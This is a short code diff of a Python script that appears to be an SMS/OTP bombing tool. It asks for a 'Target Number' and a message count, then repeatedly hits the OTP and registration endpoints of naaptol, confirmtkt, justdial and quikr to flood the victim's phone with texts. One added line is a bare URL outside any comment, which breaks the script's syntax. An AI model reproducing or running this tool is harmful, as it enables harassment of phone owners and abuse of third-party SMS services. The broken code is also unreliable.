@@ -32,6 +32,7 @@ def banner():
 
 #http://www.quikr.com/SignIn?aj=1&for=send_otp&user=
 
+https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=
 def send(num, counter, slep):
     #url = ["https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=","https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=","https://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile="]
     url="https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile="
@@ -49,3 +50,5 @@ try:
     send(input("Enter Target Number : "), int(input("Enter Number of Messages : ")), 1)
 except Exception as e:
     print("Something is wrong please Re-run this script.")
+    
+   
